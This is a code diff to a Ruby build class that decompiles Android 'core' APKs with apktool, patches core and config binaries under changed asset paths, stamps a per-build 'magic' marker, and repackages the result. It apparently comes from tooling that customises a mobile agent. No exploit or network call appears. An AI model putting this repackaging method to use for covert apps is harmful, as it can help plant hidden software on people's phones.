@@ -24,10 +24,10 @@ class BuildAndroid < Build
     Dir[path('core.*.apk')].each do |d| 
       version = d.scan(/core.android.(.*).apk/).flatten.first
 
-      CrossPlatform.exec "java", "-jar #{apktool} d #{d} #{@tmpdir}/apk.#{version}"
+      CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{d} #{@tmpdir}/apk.#{version}"
       
-      if File.exist?(path("apk.#{version}/res/raw/resources.bin"))
-        @outputs << ["apk.#{version}/res/raw/resources.bin", "apk.#{version}/res/raw/config.bin"]
+      if File.exist?(path("apk.#{version}/assets/r.bin"))
+        @outputs << ["apk.#{version}/assets/r.bin", "apk.#{version}/assets/c.bin"]
       else
         raise "unpack failed. needed file not found"
       end
@@ -46,8 +46,8 @@ class BuildAndroid < Build
 
       # add the file to be patched to the params
       # these params will be passed to the super
-      params[:core] = "apk.#{version}/res/raw/resources.bin"
-      params[:config] = "apk.#{version}/res/raw/config.bin"
+      params[:core] = "apk.#{version}/assets/r.bin"
+      params[:config] = "apk.#{version}/assets/c.bin"
       
       # invoke the generic patch method with the new params
       super
@@ -128,6 +128,42 @@ class BuildAndroid < Build
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
 
+  end
+
+  def unique(core)
+
+    Zip::ZipFile.open(core) do |z|
+      z.each do |f|
+        f_path = path(f.name)
+        FileUtils.mkdir_p(File.dirname(f_path))
+
+        # skip empty dirs
+        next if File.directory?(f.name)
+
+        z.extract(f, f_path) unless File.exist?(f_path)
+      end
+    end
+
+    apktool = path('apktool.jar')
+    Dir[path('core.*.apk')].each do |apk|
+      version = apk.scan(/core.android.(.*).apk/).flatten.first
+
+      CrossPlatform.exec "java", "-jar #{apktool} d -s -r #{apk} #{@tmpdir}/apk.#{version}"
+
+      core_content = File.open(path("apk.#{version}/assets/r.bin"), "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(path("apk.#{version}/assets/r.bin"), "wb") { |f| f.write core_content }
+
+      FileUtils.rm_rf apk
+
+      CrossPlatform.exec "java", "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}", {add_path: @tmpdir}
+
+      core_content = File.open(apk, "rb") { |f| f.read }
+
+      # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
+      CrossPlatform.exec "zip", "-j -u #{core} #{apk}"
+      FileUtils.rm_rf Config.instance.temp('apk')
+    end
   end
 
 end
